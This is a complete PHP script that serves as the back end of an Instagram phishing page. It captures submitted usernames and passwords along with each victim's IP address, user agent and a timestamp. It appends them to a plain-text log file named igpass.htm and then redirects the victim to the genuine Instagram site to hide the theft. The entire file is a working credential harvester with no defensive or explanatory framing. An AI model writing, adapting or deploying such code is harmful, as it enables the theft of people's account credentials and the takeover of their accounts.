<?php
// Start session
session_start();

// Function to sanitize input data
function sanitize_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get and sanitize form data
    $username = isset($_POST['username']) ? sanitize_input($_POST['username']) : '';
    $password = isset($_POST['password']) ? sanitize_input($_POST['password']) : '';
    
    // Get additional information
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $date_time = date('Y-m-d H:i:s');
    
    // Write to igpass.htm file
    $handle = fopen("igpass.htm", "a");
    
    // Format and write data
    fwrite($handle, "<b>Username:</b> " . $username . "<br>");
    fwrite($handle, "<b>Password:</b> " . $password . "<br>");
    fwrite($handle, "<b>Date:</b> " . $date_time . "<br>");
    fwrite($handle, "<b>IP Address:</b> " . $ip . "<br>");
    fwrite($handle, "<b>User Agent:</b> " . $user_agent . "<br>");
    fwrite($handle, "<hr>");
    
    // Close the file
    fclose($handle);
    
    // Store in session for potential later use
    $_SESSION['login_attempt'] = true;
    
    // Redirect to real Instagram
    header('Location: https://www.instagram.com/');
    exit;
} else {
    // If accessed directly without form submission, redirect to index
    header('Location: index.php');
    exit;
}
?> 